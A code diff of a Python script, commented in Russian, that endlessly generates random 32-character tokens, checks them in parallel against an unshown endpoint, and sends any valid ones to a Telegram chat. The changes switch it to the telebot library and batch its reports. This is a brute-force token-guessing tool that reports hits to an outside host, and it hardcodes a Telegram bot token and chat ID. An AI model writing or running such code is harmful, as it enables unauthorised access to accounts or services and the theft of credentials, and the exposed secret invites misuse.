@@ -1,16 +1,15 @@
 import random
 import string
 import requests
+import telebot
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from telegram import Bot
 import time
 
 # Конфигурация
 TELEGRAM_TOKEN = '7343454082:AAEwgrgB8HerkLFpcU2odZK5d9hShKKvIiQ'
 CHAT_ID = '6578018656'
 
-bot.send_message(chat_id=chat_id, text= "бот работает")
-
+bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
 def generate_token(length=32):
     """Генерирует случайный токен из букв и цифр"""
@@ -36,14 +35,17 @@ def send_telegram_message(bot, chat_id, message):
     bot.send_message(chat_id=chat_id, text=message)
 
 def main():
-    bot = Bot(token=TELEGRAM_TOKEN)
+    bot.send_message(chat_id=CHAT_ID, text="Бот работает")
     
     while True:
         # Генерируем токены
-        tokens = [generate_token() for _ in range(50)]  # Генерируем 10 токенов
+        tokens = [generate_token() for _ in range(50)]  # Генерируем 50 токенов
         print("Generated tokens:")
         for token in tokens:
             print(token)
+        
+        valid_tokens = []
+        invalid_token = None
         
         # Проверяем токены
         print("\nChecking tokens:")
@@ -52,14 +54,25 @@ def main():
             for future in as_completed(future_to_token):
                 token, is_valid = future.result()
                 if is_valid:
-                    message = f"Token {token} is valid."
-                    print(message)
-                    send_telegram_message(bot, CHAT_ID, message)
+                    valid_tokens.append(token)
                 else:
-                    print(f"Token {token} is invalid.")
-        
+                    if invalid_token is None:
+                        invalid_token = token  # Запоминаем первый невалидный токен
+
+        # Отправляем валидные токены
+        if valid_tokens:
+            for token in valid_tokens:
+                message = f"Valid token found: {token}"
+                print(message)
+                send_telegram_message(bot, CHAT_ID, message)
+        else:
+            if invalid_token:
+                message = f"All tokens are invalid. Example of an invalid token: {invalid_token}"
+                print(message)
+                send_telegram_message(bot, CHAT_ID, message)
+
         # Пауза перед следующей итерацией
-        time.sleep(10)  # Задержка 60 секунд (можете настроить по своему усмотрению)
+        time.sleep(10)  # Задержка 10 секунд (можете настроить по своему усмотрению)
 
 if __name__ == '__main__':
     main()
